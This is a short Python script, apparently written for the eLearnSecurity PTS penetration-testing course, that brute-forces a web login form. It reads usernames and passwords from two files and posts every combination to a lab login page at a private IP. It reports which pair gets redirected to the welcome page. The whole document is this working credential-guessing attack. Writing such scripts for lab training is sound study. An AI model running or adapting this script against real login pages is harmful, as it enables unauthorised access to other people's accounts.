#During elearnsecurity course PTS

import http.client, urllib.parse

host = '192.168.0.100'
port = 80

username_file = open('users.txt')
password_file = open('passwords.txt')

user_list = username_file.readlines()
password_list = password_file.readlines()

for user in user_list:
    user = user.rstrip()
    for password in password_list:
        pwd = password.rstrip()

        print(user,'-',pwd)
        post_parameters = urllib.parse.urlencode({'username': user, 'password': pwd, 'Submit': "Submit"})
        headers = {"content-type": "Application/x-www-form-urlencoded", "Accept": "text/html,application/xhtml+xml"}
        conn = http.client.HTTPConnection(host, port)
        conn.request("POST", "/bruteforce_login/verify_login.php", post_parameters, headers)
        response = conn.getresponse()

        if response.getheader("location") == "welcome.php":
            print("Logged in successfully with: ", user, '-', pwd)